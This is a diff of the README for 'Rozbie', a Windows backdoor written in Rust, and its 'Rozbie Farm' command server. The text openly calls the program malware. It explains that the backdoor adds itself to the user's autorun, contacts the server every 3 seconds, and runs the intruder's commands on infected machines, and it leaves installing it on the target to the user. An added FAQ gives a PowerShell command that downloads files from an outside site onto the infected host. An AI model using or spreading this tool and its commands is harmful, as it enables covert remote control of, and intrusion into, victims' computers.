@@ -7,17 +7,17 @@ The Rozbie works only on Windows OS.
 
 ## Project
 
-The presented soluction consists of two project:
+The presented solution consists of two project:
 
 1. Rozbie malware written in Rust. It is a program that must be run in the target system to give an intruder an access to the system's command line console.
-2. Rozbie Farm is a server in which you can execute commands to run on infected with Rozbie computers.
+2. Rozbie Farm is a server in which you can execute commands to run on infected with Rozbie computers. It can handle multiple instances of Rozbie.
 
 ![Rozbie Farm](https://github.com/rozensoftware/rozbie/blob/master/RozbieFarm.jpg)
 
 ## Installation
 
-It is up to you how you install Rozbie on the target computer. In the following updates you should find information how to do it.
-On successful run the Rozbie will add itself to the Windows current user autorun. It should start up after the user logged into system.
+It is up to you how you install Rozbie on the target computer.
+On successful run the Rozbie will add itself to the Windows current user autorun. It should run after the user logged into system.
 When it is there it will try to connect to The Rozbie Farm application once per 3 seconds.
 You should be able to type DOS commands in the Rozbie Farm appliaction to be executed on the infected computer.
 
@@ -44,7 +44,17 @@ There is a special command that can be executed only by the Rozbie:
 
 **Note:** After user logged into the system current directory of the Rozbie should be Windows\System32 which can include thousands of files.
 It's better to type first: 'cd ..' to change directory to one level up instead of 'dir'. There is a static buffer which can hold up to 1MB of data only.
-You can chage it to a bigger value of course. It is something to address in future commits but as long as it is just a small vicious program, some optimizations are missing now.
+You can change it to a bigger value of course. It is something to address in future commits but as long as it is just a small vicious program, some optimizations are missing now.
+
+## FAQ
+
+- How can I upload something to the infected host?
+
+You can do it by executing PowerShell command, e.g.:
+
+```powershell
+powershell -c "Invoke-WebRequest -Uri 'https://www.website.com/file.zip' -OutFile 'c:\temp\file.zip'"
+```
 
 ## Disclaimer
 
